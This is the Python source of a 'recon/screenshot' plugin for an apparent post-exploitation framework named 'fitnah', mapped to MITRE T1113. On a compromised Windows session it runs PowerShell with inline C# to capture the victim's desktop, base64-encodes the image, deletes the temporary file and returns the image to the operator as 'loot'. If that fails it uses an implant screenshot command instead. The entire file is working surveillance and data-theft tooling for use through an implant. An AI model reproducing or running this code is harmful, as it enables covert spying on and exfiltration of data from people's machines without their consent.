"""recon/screenshot — capture screen via System.Drawing inline C# or implant command. MITRE T1113"""
import base64
from fitnah.sdk import BasePlugin, ModuleResult, mitre
from fitnah.sdk.schema import Param, ParamSchema


class Screenshot(BasePlugin):
    NAME        = "screenshot"
    DESCRIPTION = "Capture desktop screenshot via inline C# System.Drawing; returns base64 PNG."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1113"
    CATEGORY    = "recon"

    schema = ParamSchema().add(
        Param("monitor", int, required=False, default=0,  help="Monitor index (0=all/primary)"),
        Param("quality", int, required=False, default=85, help="JPEG quality 1-100 (used for PNG compression hint)"),
    )

    _CS_SCREENSHOT = (
        "using System;"
        "using System.Drawing;"
        "using System.Drawing.Imaging;"
        "using System.IO;"
        "using System.Windows.Forms;"
        "public class ScreenCap {"
        "  public static string Capture(int monitorIndex, string outPath) {"
        "    try {"
        "      Screen[] screens = Screen.AllScreens;"
        "      Rectangle bounds;"
        "      if (monitorIndex == 0 || monitorIndex >= screens.Length) {"
        "        bounds = Rectangle.Empty;"
        "        foreach (Screen s in screens) bounds = Rectangle.Union(bounds, s.Bounds);"
        "      } else {"
        "        bounds = screens[monitorIndex].Bounds;"
        "      }"
        "      using (Bitmap bmp = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb)) {"
        "        using (Graphics g = Graphics.FromImage(bmp)) {"
        "          g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);"
        "        }"
        "        bmp.Save(outPath, ImageFormat.Png);"
        "      }"
        "      return \"OK:\" + outPath;"
        "    } catch (Exception ex) { return \"ERR:\" + ex.Message; }"
        "  }"
        "}"
    )

    @mitre("T1113")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        monitor = int(params.get("monitor", 0))
        quality = int(params.get("quality", 85))  # stored in metadata
        cs_src  = self._CS_SCREENSHOT

        # First try inline C# approach for higher quality
        ps = (
            "Add-Type -TypeDefinition '" + cs_src + "'"
            " -Language CSharp"
            " -ReferencedAssemblies System.Drawing,System.Windows.Forms;"
            "$out = \"$env:TEMP\\screen_$(Get-Random).png\";"
            "$res = [ScreenCap]::Capture(" + str(monitor) + ", $out);"
            "if ($res.StartsWith('OK:') -and (Test-Path $out)) {"
            "  $bytes = [System.IO.File]::ReadAllBytes($out);"
            "  Remove-Item $out -Force -EA SilentlyContinue;"
            "  [System.Convert]::ToBase64String($bytes);"
            "} else {"
            "  \"ERR:\" + $res;"
            "}"
        )

        r = ctx.ps(ps)

        # If PS inline C# worked, decode from base64
        if r["status"] == "ok" and r["output"] and not r["output"].startswith("ERR:"):
            try:
                png_bytes = base64.b64decode(r["output"].strip())
                return ModuleResult.ok(
                    data=png_bytes,
                    loot_kind="screenshot",
                    loot_label=f"screen_{session.hostname}",
                )
            except Exception:
                pass  # fall through to implant command

        # Fallback: implant-native screenshot command
        r2 = ctx.send("screenshot")
        if r2["status"] != "ok":
            return ModuleResult.err(r2.get("output", "Screenshot failed"))
        raw = r2.get("output", "")
        try:
            png_bytes = base64.b64decode(raw)
        except Exception:
            return ModuleResult.err(f"Bad screenshot data: {raw[:80]}")
        return ModuleResult.ok(
            data=png_bytes,
            loot_kind="screenshot",
            loot_label=f"screen_{session.hostname}",
        )
